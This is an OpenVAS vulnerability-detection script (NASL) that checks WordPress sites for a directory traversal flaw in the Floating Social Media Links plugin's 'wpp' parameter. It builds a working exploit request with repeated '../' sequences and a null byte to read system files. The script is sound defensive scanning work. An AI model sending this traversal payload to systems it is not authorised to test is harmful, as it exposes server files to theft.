###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_floating_social_media_wpp_rfi_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# WordPress Floating Social Media Links Plugin 'wpp' RFI Vulnerabilities
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation could allow attackers to perform directory traversal
  attacks and read arbitrary files on the affected application.
  Impact Level: Application";
tag_affected = "WordPress Floating Social Media Links Plugin version 1.4.2 and prior";
tag_insight = "The flaw is due to an improper validation of user supplied input to the
  'wpp' parameter in 'fsml-hideshow.js.php' and 'fsml-admin.js.php', which
  allows attackers to read arbitrary files via a ../(dot dot) sequences.";
tag_solution = "Upgrade to the WordPress Portable phpMyAdmin Plugin version 1.4.3 or later,
  For updates refer to http://wordpress.org/extend/plugins/floating-social-media-links/";
tag_summary = "This host is installed with WordPress Floating Social Media Links Plugin and
  is prone to remote file inclusion vulnerabilities.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.803078";
CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 12 $");
  script_bugtraq_id(56913);
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-12-18 12:54:08 +0530 (Tue, 18 Dec 2012)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_name("WordPress Floating Social Media Links Plugin 'wpp' RFI Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://osvdb.org/88385");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/51346");
  script_xref(name : "URL" , value : "http://wordpress.org/extend/plugins/floating-social-media-links/changelog/");

  script_description(desc);
  script_summary("Check if WP Floating Social Media Links Plugin is vulnerable to RFI");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("wordpress/installed");
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}

##
## The script code starts here
##

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

## Variable Initialization
wpPort = 0;
url = "";
dir = "";

## Get HTTP Port
if(!wpPort = get_app_port(cpe:CPE, nvt:SCRIPT_OID))exit(0);

## Check Host Supports PHP
if(!can_host_php(port:wpPort)) exit(0);

## Get WordPress Installed Location
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:wpPort))exit(0);

## traversal_files() function Returns Dictionary (i.e key value pair)
## Get Content to be checked and file to be check
files = traversal_files();

foreach file (keys(files))
{
  ## Construct directory traversal attack
  url = string(dir, "/wp-content/plugins/floating-social-media-links/" +
                    "fsml-hideshow.js.php?wpp=", crap(data:"../",length:3*15),
                    files[file],"%00");

  ## Confirm exploit worked properly or not
  if(http_vuln_check(port:wpPort, url:url,pattern:file))
  {
    security_hole(port:wpPort);
    exit(0);
  }
}
